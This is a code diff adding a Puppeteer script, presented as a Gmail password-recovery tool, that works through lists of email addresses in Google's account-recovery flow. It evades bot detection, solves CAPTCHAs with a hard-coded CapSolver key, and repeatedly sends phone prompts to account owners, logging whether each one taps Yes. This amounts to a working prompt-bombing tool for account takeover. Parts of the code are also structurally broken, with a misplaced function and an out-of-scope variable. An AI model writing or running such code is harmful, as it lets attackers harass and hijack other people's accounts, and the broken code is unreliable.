@@ -1,0 +1,1291 @@
+import puppeteer from 'puppeteer';
+import axios from 'axios';
+import fs from 'fs';
+import path from 'path';
+import { fileURLToPath } from 'url';
+
+/**
+ * Gmail Password Recovery Tool
+ * This script automates the Gmail password recovery workflow:
+ * 1. Navigate to Gmail sign-in page
+ * 2. Input email address and click next
+ * 3. Click on "Forgot password" option
+ * 
+ * Updated features:
+ * - Reads emails from /mails/input/input.txt
+ * - Implements concurrency based on /configs/concurrency.conf
+ * - Organizes output files in appropriate directories:
+ *   - /mails/output/pressed/output.txt (for users who press yes/no)
+ *   - /mails/output/unpromtable/output.txt (for unpromptable users)
+ *   - /mails/output/promptable-nopress/output.txt (for promptable users with no press)
+ * - Organizes debug logs in structured folders:
+ *   - /debug-logs/[email]/screenshots/ (for screenshots)
+ *   - /debug-logs/[email]/html-pages/ (for HTML pages)
+ *   - /debug-logs/[email]/console/ (for console logs)
+ */
+
+// Get the directory name of the current module
+const __dirname = path.dirname(fileURLToPath(import.meta.url));
+
+// Original console.log and console.error functions
+const originalConsoleLog = console.log;
+const originalConsoleError = console.error;
+
+// If you get "require is not defined in ES module scope", rename this file to .cjs or use import syntax instead of require.
+async function runGmailPasswordRecovery(email) {
+  console.log('Starting Gmail password recovery process...');
+  
+  // Setup directories for screenshots and HTML pages
+  const emailDir = path.join(__dirname, 'debug-logs', email);
+  const screenshotsDir = path.join(emailDir, 'screenshots');
+  const htmlPagesDir = path.join(emailDir, 'html-pages');
+  
+  // Create directories if they don't exist
+  [screenshotsDir, htmlPagesDir].forEach(dir => {
+    if (!fs.existsSync(dir)) {
+      fs.mkdirSync(dir, { recursive: true });
+    }
+  });
+  
+  // Create timestamp for file names
+  const now = new Date();
+  const month = now.toLocaleString('en-US', { month: 'short' });
+  const day = now.getDate().toString().padStart(2, '0');
+  const hours = now.getHours().toString().padStart(2, '0');
+  const minutes = now.getMinutes().toString().padStart(2, '0');
+  const timestamp = `${month}${day}-${hours}${minutes}`;
+  
+  // Configure browser options with enhanced stealth settings
+  const options = {
+    headless: false, // Running in headed mode for testing
+    defaultViewport: null,
+    args: [
+      '--no-sandbox',
+      '--disable-setuid-sandbox',
+      '--disable-infobars',
+      '--window-size=1366,768',
+      '--disable-blink-features=AutomationControlled',
+      '--disable-features=IsolateOrigins,site-per-process',
+      '--disable-web-security',
+      '--disable-site-isolation-trials',
+      '--disable-features=BlockInsecurePrivateNetworkRequests',
+      '--disable-extensions',
+      '--disable-component-extensions-with-background-pages',
+      '--disable-default-apps',
+      '--disable-breakpad',
+      '--disable-dev-shm-usage',
+      '--disable-ipc-flooding-protection',
+      '--disable-renderer-backgrounding',
+      '--disable-background-timer-throttling',
+      '--disable-backgrounding-occluded-windows',
+      '--disable-restore-session-state',
+      '--disable-sync',
+      '--disable-translate',
+      '--metrics-recording-only',
+      '--no-first-run',
+      '--no-default-browser-check',
+      '--no-zygote',
+      '--password-store=basic',
+      '--use-mock-keychain',
+      '--enable-webgl',
+      '--ignore-certificate-errors',
+      '--allow-running-insecure-content',
+      '--autoplay-policy=user-gesture-required',
+      '--font-render-hinting=none',
+      '--enable-features=NetworkServiceInProcess2',
+      '--force-color-profile=srgb',
+      '--mute-audio',
+    ],
+    ignoreDefaultArgs: ['--enable-automation'],
+  };
+  
+  // Launch puppeteer directly with enhanced stealth settings
+  console.log('Launching browser with enhanced stealth techniques...');
+  const browser = await puppeteer.launch(options);
+  
+  // Create a new page
+  const page = await browser.newPage();
+  
+  // Ensure the page variable is defined before use
+  if (!page) {
+    throw new Error('Failed to create a new page.');
+  }
+  
+  // Add navigation event listener to check for CAPTCHA after email input page
+  page.on('framenavigated', async frame => {
+    if (frame === page.mainFrame()) {
+      const url = frame.url();
+      console.log('\nPage navigated to: ' + url);
+      
+      // Only check for CAPTCHA if we're past the email input page
+      if (url.includes('/challenge/') || url.includes('/pwd/') || url.includes('/signin/v2/challenge/')) {
+        console.log('Post-email page detected, checking for CAPTCHA...');
+        // Add a slightly longer delay to ensure the page is fully loaded
+        setTimeout(async () => {
+          if (await checkForCaptcha(page)) {
+            console.log('CAPTCHA NEEDED - DETECTED DURING NAVIGATION EVENT!');
+            await page.screenshot({ path: `captcha-during-navigation-${Date.now()}.png` });
+          }
+        }, 1500); // Slightly longer delay to ensure page is fully loaded
+      }
+    }
+  });
+  
+  // Monitor network requests for CAPTCHA-related resources
+  page.on('request', async request => {
+    const url = request.url();
+    if (url.includes('/Captcha') || url.includes('captcha') || url.includes('CAPTCHA')) {
+      console.log('\n==============================================');
+      console.log('CAPTCHA NEEDED - DETECTED IN NETWORK REQUEST');
+      console.log(`REQUEST URL: ${url}`);
+      console.log('==============================================\n');
+      
+      // Take a screenshot when a CAPTCHA-related request is detected
+      try {
+        await page.screenshot({ path: path.join(screenshotsDir, `captcha-network-request-${timestamp}.png`) });
+      } catch (e) {
+        console.error('Error taking screenshot:', e);
+      }
+    }
+  });
+  
+  // Monitor network responses for CAPTCHA-related resources
+  page.on('response', async response => {
+    const url = response.url();
+    if (url.includes('/Captcha') || url.includes('captcha') || url.includes('CAPTCHA')) {
+      console.log('\n==============================================');
+      console.log('CAPTCHA NEEDED - DETECTED IN NETWORK RESPONSE');
+      console.log(`RESPONSE URL: ${url}`);
+      console.log(`RESPONSE STATUS: ${response.status()}`);
+      console.log('==============================================\n');
+      
+      // If it's an image response, try to extract it
+      const contentType = response.headers()['content-type'] || '';
+      if (contentType.includes('image')) {
+        console.log('CAPTCHA IMAGE DETECTED IN NETWORK RESPONSE');
+        try {
+          // Store the image URL for later use
+          global.captchaImageUrl = url;
+          console.log('CAPTCHA IMAGE URL STORED:', url);
+        } catch (e) {
+          console.error('Error processing CAPTCHA image from network response:', e);
+        }
+      }
+    }
+  });
+
+  
+  // Set user agent to appear more like a regular browser
+  const userAgents = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0'
+  ];
+  const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
+  await page.setUserAgent(randomUserAgent);
+  console.log(`Using random user agent: ${randomUserAgent}`);
+  
+  // Set extra HTTP headers to make the browser appear more human-like
+  await page.setExtraHTTPHeaders({
+    'Accept-Language': 'en-US,en;q=0.9',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1'
+  });
+  
+  // Override navigator properties to avoid detection
+  await page.evaluateOnNewDocument(() => {
+    // Override properties that are used to detect automation
+    Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
+    Object.defineProperty(navigator, 'plugins', {
+      get: () => [
+        { name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer' },
+        { name: 'Chrome PDF Viewer', filename: 'chrome-pdf-viewer' },
+        { name: 'Native Client', filename: 'native-client' }
+      ]
+    });
+    Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en', 'en-GB'] });
+    Object.defineProperty(navigator, 'platform', { get: () => 'Win32' });
+    Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 });
+    Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 });
+    
+    // Override the permissions API
+    const originalQuery = window.navigator.permissions.query;
+    window.navigator.permissions.query = (parameters) => (
+      parameters.name === 'notifications' ?
+        Promise.resolve({ state: Notification.permission }) :
+        originalQuery(parameters)
+    );
+    
+    // Add a more realistic WebGL renderer
+    const getParameter = WebGLRenderingContext.prototype.getParameter;
+    WebGLRenderingContext.prototype.getParameter = function(parameter) {
+      if (parameter === 37445) {
+        return 'Google Inc. (NVIDIA)';
+      }
+      if (parameter === 37446) {
+        return 'ANGLE (NVIDIA, NVIDIA GeForce RTX 3060 Direct3D11 vs_5_0 ps_5_0)';
+      }
+      return getParameter.apply(this, [parameter]);
+    };
+
+    // Override canvas fingerprinting
+    const originalGetContext = HTMLCanvasElement.prototype.getContext;
+    HTMLCanvasElement.prototype.getContext = function(type) {
+      const context = originalGetContext.apply(this, arguments);
+      if (type === '2d') {
+        const originalGetImageData = context.getImageData;
+        context.getImageData = function() {
+          const imageData = originalGetImageData.apply(this, arguments);
+          return imageData;
+        };
+      }
+      return context;
+    };
+  });
+  
+  console.log('Applied advanced stealth techniques');
+
+
+  // Function to simulate human-like mouse movement
+  async function simulateHumanMouseMovement(page) {
+    const { width, height } = await page.evaluate(() => ({
+      width: window.innerWidth,
+      height: window.innerHeight
+    }));
+
+    // Generate random points for mouse movement
+    const points = Array.from({ length: 5 }, () => ({
+      x: Math.floor(Math.random() * width),
+      y: Math.floor(Math.random() * height)
+    }));
+
+    // Move mouse through random points with random delays
+    for (const point of points) {
+      await page.mouse.move(point.x, point.y, {
+        steps: Math.floor(Math.random() * 10) + 5 // Random steps between 5-15
+      });
+      await page.waitForTimeout(Math.floor(Math.random() * 200) + 100);
+    }
+  }
+
+  // Variable to track the result of the recovery process
+  let recoveryResult = 'promptable-nopress';
+  
+  try {
+    // We already created a page earlier, no need to create another one
+    // This was causing issues with duplicate pages
+    
+    // Add a random delay before navigation to mimic human behavior
+    const randomDelay = Math.floor(Math.random() * 2000) + 1000; // 1-3 seconds
+    console.log(`Adding random delay of ${randomDelay}ms before navigation...`);
+    await page.waitForTimeout(randomDelay);
+    
+    // Navigate to Gmail sign-in page
+    console.log('Navigating to Gmail sign-in page...');
+    await page.goto('https://accounts.google.com/AccountChooser/signinchooser?service=mail&continue=https://mail.google.com/mail/&flowName=GlifWebSignIn&flowEntry=AccountChooser&ec=asw-gmail-globalnav-signin', {
+      waitUntil: 'networkidle2',
+      timeout: 60000
+    });
+    
+    // Add a random delay to mimic human behavior
+    await page.waitForTimeout(Math.floor(Math.random() * 1000) + 500);
+    
+    // Wait for the email input field to be visible
+    console.log('Waiting for email input field...');
+    await page.waitForSelector('input[type="email"]', { visible: true, timeout: 30000 });
+    
+    // Simulate human-like mouse movement before interacting with the field
+    await simulateHumanMouseMovement(page);
+    await page.mouse.move(Math.random() * 100 + 200, Math.random() * 50 + 200, { steps: 10 });
+    
+    // Add human-like typing behavior with random delays between keystrokes
+    console.log(`Entering email address: ${email}`);
+    for (const char of email) {
+      await page.type('input[type="email"]', char, { delay: Math.floor(Math.random() * 100) + 50 });
+      // Small random pause between some characters
+      if (Math.random() > 0.7) {
+        await page.waitForTimeout(Math.floor(Math.random() * 200) + 100);
+      }
+    }
+    
+    // Add a random delay before clicking Next to mimic human behavior
+    await page.waitForTimeout(Math.floor(Math.random() * 1000) + 500);
+    
+    // Simulate human-like mouse movement before clicking Next
+    console.log('Moving mouse to Next button...');
+    await simulateHumanMouseMovement(page);
+    const nextButton = await page.$('#identifierNext');
+    const nextButtonBox = await nextButton.boundingBox();
+    await page.mouse.move(
+      nextButtonBox.x + nextButtonBox.width / 2 + (Math.random() * 10 - 5),
+      nextButtonBox.y + nextButtonBox.height / 2 + (Math.random() * 10 - 5),
+      { steps: 10 }
+    );
+    
+    // Click the Next button with human-like behavior
+    console.log('Clicking Next button...');
+    await page.mouse.down();
+    await page.waitForTimeout(Math.random() * 100 + 50);
+    await page.mouse.up();
+    await Promise.all([
+      page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 30000 }),
+      page.click('#identifierNext')
+    ]);
+    
+    // Add error handling for security challenges
+    const securityChallengeSelector = 'div[aria-live="polite"]';
+    try {
+      const securityChallenge = await page.waitForSelector(securityChallengeSelector, { timeout: 5000 });
+      if (securityChallenge) {
+        const challengeText = await page.evaluate(el => el.textContent, securityChallenge);
+        console.log(`Security challenge detected: ${challengeText}`);
+        console.log('Taking screenshot of security challenge...');
+        await page.screenshot({ path: 'security-challenge.png' });
+      }
+    } catch (e) {
+      // No security challenge detected, continue
+      console.log('No immediate security challenge detected, continuing...');
+    }
+    
+    // Enhanced CAPTCHA detection after clicking Next
+    try {
+      console.log('Checking for CAPTCHA after clicking Next...');
+      
+      // Wait a moment for any potential CAPTCHA to load
+      await page.waitForTimeout(2000);
+      
+      // Check the current URL to see if we're on a post-email page
+      const currentUrl = page.url();
+      const isPastEmailPage = currentUrl.includes('/challenge/') || 
+                             currentUrl.includes('/pwd/') || 
+                             currentUrl.includes('/signin/v2/challenge/');
+      
+      if (isPastEmailPage) {
+        console.log('We are on a post-email page, checking for CAPTCHA...');
+        
+        // Use the dedicated CAPTCHA detection function
+        const captchaExists = await checkForCaptcha(page);
+        
+        if (captchaExists) {
+          console.log('==============================================');
+          console.log('CAPTCHA NEEDED');
+          console.log('==============================================');
+          
+          // Extract the CAPTCHA image source with more specific selector
+          const captchaImgSrc = await page.evaluate(() => {
+            // Try the exact selector first
+            const captchaImg = document.querySelector('img[id="captchaimg"][alt="CAPTCHA image of text used to distinguish humans from robots"]');
+            if (captchaImg) return { src: captchaImg.src, found: 'exact_match' };
+            
+            // Fallback to other possible selectors
+            const fallbackImg = document.querySelector('img[id="captchaimg"], img[alt*="CAPTCHA"], img[src*="captcha"]');
+            if (fallbackImg) return { src: fallbackImg.src, found: 'fallback_match' };
+            
+            // Check if we have a CAPTCHA image URL from network monitoring
+            if (window.captchaImageUrl || (typeof global !== 'undefined' && global.captchaImageUrl)) {
+              const storedUrl = window.captchaImageUrl || global.captchaImageUrl;
+              return { src: storedUrl, found: 'network_monitoring' };
+            }
+            
+            return { src: null, found: 'none' };
+          });
+          
+          if (captchaImgSrc.src) {
+            console.log(`CAPTCHA IMAGE DETECTED (${captchaImgSrc.found})`);
+            console.log('CAPTCHA image source:', captchaImgSrc.src);
+            
+            // Take screenshot of the CAPTCHA for debugging with timestamp
+            await page.screenshot({ path: path.join(screenshotsDir, `captcha-detected-${timestamp}.png`) });
+            
+            // Extract base64 image data if it's embedded
+            let imageData = captchaImgSrc.src;
+            if (captchaImgSrc.src.startsWith('data:image')) {
+              imageData = captchaImgSrc.src.split(',')[1];
+              console.log('CAPTCHA IMAGE EXTRACTED: Base64 data successfully extracted');
+            } else {
+              // If it's a URL, fetch the image
+              console.log('CAPTCHA IMAGE IS URL: Fetching image data...');
+              try {
+                const response = await axios.get(captchaImgSrc.src, { responseType: 'arraybuffer' });
+                // Convert the image to base64
+                imageData = Buffer.from(response.data, 'binary').toString('base64');
+                console.log('CAPTCHA IMAGE EXTRACTED: Successfully fetched and converted to base64');
+              } catch (fetchError) {
+                console.error('ERROR: Failed to fetch CAPTCHA image:', fetchError);
+              }
+            }
+          } else {
+            // If no image source was found in the DOM, check if we can extract it from page sources
+            console.log('Attempting to extract CAPTCHA from page sources...');
+            const extractedCaptcha = await extractCaptchaFromSources(page);
+            if (extractedCaptcha) {
+              console.log('CAPTCHA EXTRACTED FROM PAGE SOURCES');
+              let imageData = extractedCaptcha;
+              
+              // Use the extracted CAPTCHA image for solving
+              try {
+                console.log('CAPTCHA SOLVING: SENDING EXTRACTED CAPTCHA TO CAPSOLVER API...');
+                const apiKey = 'CAP-95B3B5A9243825F06CF961F3E458A2068C26ABBA8E1C3D587EE9D9E6EB48C883';
+                const solution = await solveCaptchaWithCapSolver(imageData, apiKey);
+                
+                if (solution) {
+                  console.log('EXTRACTED CAPTCHA SOLVED SUCCESSFULLY:', solution);
+                  
+                  // Find the CAPTCHA input field
+                  const captchaInputSelector = 'input[aria-label="Type the text you hear or see"]';
+                  const captchaInput = await page.$(captchaInputSelector);
+                  
+                  if (captchaInput) {
+                    console.log('CAPTCHA INPUT FIELD FOUND: Entering solution...');
+                    // Type the solution with human-like delays
+                    for (const char of solution) {
+                      await captchaInput.type(char, { delay: Math.floor(Math.random() * 100) + 50 });
+                      if (Math.random() > 0.7) {
+                        await page.waitForTimeout(Math.floor(Math.random() * 200) + 100);
+                      }
+                    }
+                    
+                    // Click the submit button
+                    console.log('CAPTCHA SOLUTION ENTERED: Looking for submit button...');
+                    const submitButton = await page.$('#submit, button[type="submit"], #identifierNext');
+                    if (submitButton) {
+                      console.log('SUBMIT BUTTON FOUND: Clicking...');
+                      await submitButton.click();
+                      console.log('CAPTCHA SUBMITTED SUCCESSFULLY');
+                    } else {
+                      // Fallback: try to find the submit button by text
+                      console.log('SUBMIT BUTTON NOT FOUND: Trying to find by text...');
+                      const buttons = await page.$$('button');
+                      let buttonFound = false;
+                      for (const btn of buttons) {
+                        const text = await page.evaluate(el => el.textContent, btn);
+                        if (text && ['next', 'submit', 'verify'].some(keyword => text.trim().toLowerCase().includes(keyword))) {
+                          console.log(`FOUND BUTTON WITH TEXT: "${text.trim()}". Clicking...`);
+                          await btn.click();
+                          buttonFound = true;
+                          break;
+                        }
+                      }
+                      if (!buttonFound) {
+                        console.error('FAILED TO FIND SUBMIT BUTTON: Unable to submit CAPTCHA solution');
+                      }
+                    }
+                  } else {
+                    console.error('CAPTCHA INPUT FIELD NOT FOUND: Unable to enter solution');
+                  }
+                } else {
+                  console.error('CAPTCHA SOLVING FAILED: No solution returned from API');
+                }
+              } catch (solveError) {
+                console.error('ERROR DURING EXTRACTED CAPTCHA SOLVING:', solveError);
+              }
+            }
+          }
+          
+          // Extract CAPTCHA from page sources function
+async function extractCaptchaFromSources(page) {
+  console.log('Extracting CAPTCHA from page sources...');
+  
+  try {
+    // Method 1: Check for CAPTCHA in the page's HTML source
+    const htmlSource = await page.content();
+    
+    // Look for image tags with CAPTCHA-related attributes in the source
+    const captchaImgRegex = /<img[^>]*(?:id=["']captchaimg["']|src=["'][^"']*(?:captcha|Captcha)[^"']*["']|alt=["'][^"']*(?:CAPTCHA|captcha)[^"']*["'])[^>]*>/gi;
+    const captchaImgMatches = htmlSource.match(captchaImgRegex);
+    
+    if (captchaImgMatches && captchaImgMatches.length > 0) {
+      console.log(`Found ${captchaImgMatches.length} potential CAPTCHA image tags in source`);
+      
+      // Extract the src attribute from the first match
+      const srcRegex = /src=["']([^"']*)["']/i;
+      const srcMatch = captchaImgMatches[0].match(srcRegex);
+      
+      if (srcMatch && srcMatch[1]) {
+        const captchaUrl = srcMatch[1];
+        console.log('CAPTCHA IMAGE URL FOUND IN SOURCE:', captchaUrl);
+        
+        // Fetch the image data
+        try {
+          const response = await axios.get(captchaUrl, { responseType: 'arraybuffer' });
+          // Convert the image to base64
+          const imageData = Buffer.from(response.data, 'binary').toString('base64');
+          console.log('CAPTCHA IMAGE EXTRACTED FROM SOURCE: Successfully fetched and converted to base64');
+          return imageData;
+        } catch (fetchError) {
+          console.error('ERROR: Failed to fetch CAPTCHA image from source:', fetchError);
+        }
+      }
+    }
+    
+    // Method 2: Check if we have a stored CAPTCHA URL from network monitoring
+    if (global.captchaImageUrl) {
+      console.log('Using stored CAPTCHA image URL from network monitoring:', global.captchaImageUrl);
+      try {
+        const response = await axios.get(global.captchaImageUrl, { responseType: 'arraybuffer' });
+        // Convert the image to base64
+        const imageData = Buffer.from(response.data, 'binary').toString('base64');
+        console.log('CAPTCHA IMAGE EXTRACTED FROM NETWORK MONITORING: Successfully fetched and converted to base64');
+        return imageData;
+      } catch (fetchError) {
+        console.error('ERROR: Failed to fetch CAPTCHA image from network monitoring:', fetchError);
+      }
+    }
+    
+    // Method 3: Look for base64 encoded images in the source that might be CAPTCHAs
+    const base64ImgRegex = /data:image\/[^;]+;base64,([^"'\s]+)/gi;
+    const base64Matches = htmlSource.match(base64ImgRegex);
+    
+    if (base64Matches && base64Matches.length > 0) {
+      console.log(`Found ${base64Matches.length} base64 encoded images in source`);
+      
+      // Check each base64 image to see if it might be a CAPTCHA (small size is typical for CAPTCHAs)
+      for (const base64Img of base64Matches) {
+        // Extract just the base64 data
+        const base64Data = base64Img.split(',')[1];
+        console.log('Potential CAPTCHA found in base64 encoded image');
+        return base64Data;
+      }
+    }
+    
+    // Method 4: Last resort - save the full HTML source for debugging
+    console.log('No CAPTCHA found in page sources, saving HTML for debugging');
+    // Save the HTML source to a file with timestamp for debugging
+    try {
+      // Use writeFileSync from fs module that was imported at the top of the file
+      const fs = await import('fs');
+      fs.writeFileSync(`captcha-debug-source-${Date.now()}.html`, htmlSource);
+      console.log('HTML source saved for debugging');
+    } catch (writeError) {
+      console.error('Error saving HTML source:', writeError);
+    }
+    
+    return null;
+  } catch (error) {
+    console.error('Error extracting CAPTCHA from page sources:', error);
+    return null;
+  }
+}
+
+// Integration with CapSolver API for CAPTCHA solving
+          try {
+            console.log('CAPTCHA SOLVING: SENDING TO CAPSOLVER API...');
+            const apiKey = 'CAP-95B3B5A9243825F06CF961F3E458A2068C26ABBA8E1C3D587EE9D9E6EB48C883';
+            const solution = await solveCaptchaWithCapSolver(imageData, apiKey);
+            
+            if (solution) {
+              console.log('CAPTCHA SOLVED SUCCESSFULLY:', solution);
+              
+              // Find the CAPTCHA input field
+              const captchaInputSelector = 'input[aria-label="Type the text you hear or see"]';
+              const captchaInput = await page.$(captchaInputSelector);
+              
+              if (captchaInput) {
+                console.log('CAPTCHA INPUT FIELD FOUND: Entering solution...');
+                // Type the solution with human-like delays
+                for (const char of solution) {
+                  await captchaInput.type(char, { delay: Math.floor(Math.random() * 100) + 50 });
+                  if (Math.random() > 0.7) {
+                    await page.waitForTimeout(Math.floor(Math.random() * 200) + 100);
+                  }
+                }
+                
+                // Click the submit button
+                console.log('CAPTCHA SOLUTION ENTERED: Looking for submit button...');
+                const submitButton = await page.$('#submit, button[type="submit"], #identifierNext');
+                if (submitButton) {
+                  console.log('SUBMIT BUTTON FOUND: Clicking...');
+                  await submitButton.click();
+                  console.log('CAPTCHA SUBMITTED SUCCESSFULLY');
+                } else {
+                  // Fallback: try to find the submit button by text
+                  console.log('SUBMIT BUTTON NOT FOUND: Trying to find by text...');
+                  const buttons = await page.$$('button');
+                  let buttonFound = false;
+                  for (const btn of buttons) {
+                    const text = await page.evaluate(el => el.textContent, btn);
+                    if (text && ['next', 'submit', 'verify'].some(keyword => text.trim().toLowerCase().includes(keyword))) {
+                      console.log(`FOUND BUTTON WITH TEXT: "${text.trim()}". Clicking...`);
+                      await btn.click();
+                      buttonFound = true;
+                      break;
+                    }
+                  }
+                  if (!buttonFound) {
+                    console.error('FAILED TO FIND SUBMIT BUTTON: Unable to submit CAPTCHA solution');
+                  }
+                }
+              } else {
+                console.error('CAPTCHA INPUT FIELD NOT FOUND: Unable to enter solution');
+              }
+            } else {
+              console.error('CAPTCHA SOLVING FAILED: No solution returned from API');
+            }
+          } catch (solveError) {
+            console.error('ERROR DURING CAPTCHA SOLVING:', solveError);
+          }
+        } else {
+          console.error('CAPTCHA IMAGE SOURCE NOT FOUND');
+        }
+      } else {
+        console.log('No CAPTCHA detected, continuing...');
+      }
+    } catch (captchaError) {
+      console.error('Error during CAPTCHA detection/solving:', captchaError);
+    }
+    
+    // Final comprehensive CAPTCHA check before proceeding to password page
+    console.log('\n==============================================');
+    console.log('FINAL CAPTCHA CHECK BEFORE PASSWORD PAGE');
+    console.log('Current URL:', page.url());
+    console.log('==============================================\n');
+    
+    // Wait a bit longer to ensure any CAPTCHA has time to fully load
+    await page.waitForTimeout(3000);
+    
+    // Check if we're on a post-email page that might have CAPTCHA
+    const finalUrl = page.url();
+    if (finalUrl.includes('/challenge/') || finalUrl.includes('/pwd/') || finalUrl.includes('/signin/v2/challenge/')) {
+      console.log('We are on a post-email page, performing final CAPTCHA check...');
+      
+      if (await checkForCaptcha(page)) {
+        console.log('\n==============================================');
+        console.log('CAPTCHA NEEDED - DETECTED IN FINAL CHECK');
+        console.log('==============================================\n');
+        // Take additional screenshot with timestamp
+        await page.screenshot({ path: `captcha-final-check-${Date.now()}.png` });
+      } else {
+        console.log('No CAPTCHA detected in final check, proceeding to password page');
+      }
+    } else {
+      console.log('Not on a post-email page yet, skipping CAPTCHA check');
+    }
+    
+    // Wait for the password page to load and look for the "Forgot password" link
+    console.log('Looking for Forgot password link...');
+    
+    // Add a delay to ensure the page is fully loaded
+    await page.waitForTimeout(2000);
+
+    // Wait for the password input field to be visible first
+    await page.waitForSelector('input[type="password"]', { visible: true, timeout: 30000 });
+    
+    // Use the ID selector for the "Forgot password" button container
+    const forgotPasswordSelector = '#forgotPassword';
+    await page.waitForSelector(forgotPasswordSelector, { visible: true, timeout: 30000 });
+    
+    // Click on "Forgot password" using multiple methods to ensure success
+    try {
+      // First attempt: Click using the ID selector with human-like movement
+      console.log('Moving to Forgot Password button...');
+      await simulateHumanMouseMovement(page);
+      const forgotPasswordButton = await page.$(forgotPasswordSelector);
+      const buttonBox = await forgotPasswordButton.boundingBox();
+      
+      
+      await page.mouse.move(
+        buttonBox.x + buttonBox.width / 2 + (Math.random() * 10 - 5),
+        buttonBox.y + buttonBox.height / 2 + (Math.random() * 10 - 5),
+        { steps: 10 }
+      );
+      
+      
+      if (forgotPasswordButton) {
+        await page.mouse.down();
+        await page.waitForTimeout(Math.random() * 100 + 50);
+        await page.mouse.up();
+        await forgotPasswordButton.click();
+      } else {
+        // Fallback: Look for the text content
+        console.log('ID selector failed, trying text content approach...');
+        const spanSelector = 'span.VfPpkd-vQzf8d';
+        const elements = await page.$$(spanSelector);
+        for (const element of elements) {
+          const text = await page.evaluate(el => el.textContent, element);
+          if (text.trim() === 'Forgot password?') {
+            console.log('Found "Forgot password?" link by text, attempting to click...');
+            const parentButton = await element.evaluateHandle(el => el.closest('button'));
+            await parentButton.click();
+            break;
+          }
+        }
+      }
+      
+      console.log('Successfully clicked "Forgot password?"');
+    } catch (error) {
+      console.error('Error clicking "Forgot password?" link:', error);
+      // Take screenshot if click fails
+      await page.screenshot({ path: 'forgot-password-error.png' });
+    }
+
+    // Wait a moment to ensure the recovery page loads
+    await page.waitForTimeout(5000);
+
+    // Optional: Take a screenshot to verify the process completed successfully
+    await page.screenshot({ path: 'recovery-page.png' });
+
+    // --- Begin: Check for phone prompt and resend logic ---
+    let promptSent = false;
+    let promptTextFound = false;
+    try {
+      // Check if the page contains "Check your phone"
+      promptTextFound = await page.evaluate(() => {
+        const elements = Array.from(document.querySelectorAll('div,span,p'));
+        return elements.some(el => el.textContent && el.textContent.includes('Check your phone'));
+      });
+      if (promptTextFound) {
+        console.log('Prompt Sent');
+        promptSent = true;
+      } else {
+        console.log('Unable to Prompt');
+      }
+    } catch (e) {
+      console.log('Unable to Prompt');
+    }
+
+    if (promptSent) {
+      let pressDetected = false;
+      for (let attempt = 0; attempt < 4; attempt++) {
+        // Wait 30 seconds
+        await page.waitForTimeout(30000);
+        // Check if the user pressed Yes/No (simulate detection)
+        pressDetected = await page.evaluate(() => {
+          const elements = Array.from(document.querySelectorAll('div,span,p'));
+          return elements.some(el => el.textContent && (el.textContent.includes('You tapped Yes') || el.textContent.includes('You tapped No on the notification sent to your phone')));
+        });
+        if (pressDetected) {
+          break;
+        }
+        // Try to find and click the "Resend It" button
+        const resendButtonSelector = 'button';
+        const resendButton = await page.evaluateHandle(() => {
+          const buttons = Array.from(document.querySelectorAll('button'));
+          return buttons.find(btn => btn.textContent && btn.textContent.trim() === 'Resend It');
+        });
+        if (resendButton) {
+          try {
+            await resendButton.click();
+            console.log('Resend button clicked.');
+          } catch (e) {
+            console.log('Could not click Resend button.');
+          }
+        } else {
+          console.log('Resend button not found.');
+        }
+      }
+      if (!pressDetected) {
+        console.log('No Press Detected');
+      }
+    }
+    // --- End: Check for phone prompt and resend logic ---
+
+    // --- Begin: Detect phone prompt response ---
+    let responseRecorded = false;
+    try {
+      // Wait for either the Yes or No response message to appear
+      const yesSelector = 'div,span,p'; // General selectors for text nodes
+      const noSelector = 'div,span,p';
+      const yesText = 'You tapped Yes';
+      const noText = 'You tapped No on the notification sent to your phone, so we stopped this recovery attempt.';
+      const maxWait = 120000; // Wait up to 2 minutes
+      const pollInterval = 2000;
+      let elapsed = 0;
+      while (elapsed < maxWait && !responseRecorded) {
+        // Check for No response
+        const noFound = await page.evaluate((noText) => {
+          const elements = Array.from(document.querySelectorAll('div,span,p'));
+          return elements.some(el => el.textContent && el.textContent.includes(noText));
+        }, noText);
+        if (noFound) {
+          console.log('User tapped NO on their phone.');
+          console.log('You tapped No on the notification sent to your phone, so we stopped this recovery attempt.\nIf this was a mistake, try signing in again.');
+          responseRecorded = true;
+          break;
+        }
+        // Check for Yes response (simulate, as actual text may differ)
+        const yesFound = await page.evaluate(() => {
+          const elements = Array.from(document.querySelectorAll('div,span,p'));
+          return elements.some(el => el.textContent && (el.textContent.includes('Change your password') || el.textContent.includes('Create a strong password')));
+        });
+        if (yesFound) {
+          console.log('User tapped YES on their phone.');
+          console.log('Taking user to the change password page...');
+          responseRecorded = true;
+          // Optionally, you could add more automation here to handle the password change
+          break;
+        }
+        await page.waitForTimeout(pollInterval);
+        elapsed += pollInterval;
+      }
+      if (!responseRecorded) {
+        console.log('No response detected from phone prompt after waiting.');
+      }
+    } catch (err) {
+      console.error('Error while detecting phone prompt response:', err);
+    }
+    // --- End: Detect phone prompt response ---
+
+    // CAPTCHA handling has been integrated earlier in the workflow
+    // No need for additional CAPTCHA detection here
+
+    console.log('Password recovery workflow completed successfully!');
+    
+  } catch (error) {
+    console.error('An error occurred during the password recovery process:', error);
+  } finally {
+    // Close the browser
